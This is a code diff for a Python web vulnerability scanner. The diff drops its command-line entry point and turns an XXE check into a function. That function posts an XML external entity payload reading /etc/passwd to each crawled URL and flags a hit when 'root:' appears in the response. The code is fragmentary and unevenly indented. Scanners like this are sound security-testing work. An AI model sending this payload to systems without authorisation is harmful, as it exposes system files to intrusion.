@@ -1,22 +1,9 @@
-import argparse
 import requests
 from urllib.parse import urljoin
 from bs4 import BeautifulSoup
 import re
 
-def main():
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-u", "--url", help="URL to scan", required=True)
-    args = parser.parse_args()
 
-    print("Starting scan for URL: ", args.url)
-    
-    results = scan_website(args.url)
-    
-    print("Scan completed! Found {} vulnerabilities.".format(len(results)))
-    for r in results:
-        print(r)
-        
 def scan_website(url):
     results = []
     
@@ -35,6 +22,9 @@ def scan_website(url):
             
         if check_lfi(u):
             results.append({'url': u, 'vuln': 'Local File Inclusion'})
+        
+        if check_xee(u):
+            results.append({'url': u, 'vuln': 'XML External Entity'}) 
             
     return results
         
@@ -68,27 +58,18 @@ def check_sqli(url, response):
   
   return False
 
-# Các endpoints cần kiểm tra XEE
-  xee_endpoints = ["/api/xml", "/upload"]
-  
-  # Payload XEE
+def check_xee(url):
+
   xee_payload = '''<?xml version="1.0" encoding="ISO-8859-1"?>  
   <!DOCTYPE foo [ <!ENTITY xee SYSTEM "file:///etc/passwd" > ]>
   <root>&xee;</root>'''
 
-  # Crawl website
-  urls = crawl(url)
+  response = requests.post(url, data=xee_payload)
 
-  for u in urls:    
-    # Code kiểm tra XSS
-    if u in xee_endpoints:
-       # Gửi payload XEE
-       response = requests.post(u, data=xee_payload)
-       
-       if "root:" in response.text:
-          results.append({'url': u, 'vuln': 'XML External Entity'})
+  if "root:" in response.text:
+     return True
   
-  return results
+  return False
 
 # Hàm kiểm tra XSS
 def check_xss(url, response):
